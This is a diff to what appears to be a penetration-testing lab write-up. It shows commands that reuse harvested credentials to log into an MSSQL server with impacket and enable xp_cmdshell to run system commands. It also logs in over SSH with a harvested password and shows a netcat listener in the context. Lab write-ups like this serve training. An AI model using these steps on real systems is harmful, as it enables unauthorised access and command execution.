@@ -126,7 +126,7 @@ nc -lvnp 1234
 ```bash
 # Use the credentials found in the fuzzed file under 
 # project/backup/test in the previous machine
-python2 /usr/share/doc/python3-impacket/examples/mssqlclient.py fooadmin:fooadmin@172.16.64.199
+python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py fooadmin:fooadmin@172.16.64.199
 enable_xp_cmdshell
 RECONFIGURE
 xp_cmdshell whoami
@@ -151,8 +151,8 @@ We use the credentials harvested in the Windows machine:
 
 ```bash
 sshpass -p dF3334slKw ssh developer@172.16.64.182
-find . | grep flag
-cat flag.txt 
+developer@xubuntu:~$ find . | grep flag
+developer@xubuntu:~$ cat flag.txt 
 Congratulations, you got it!
 ```
 
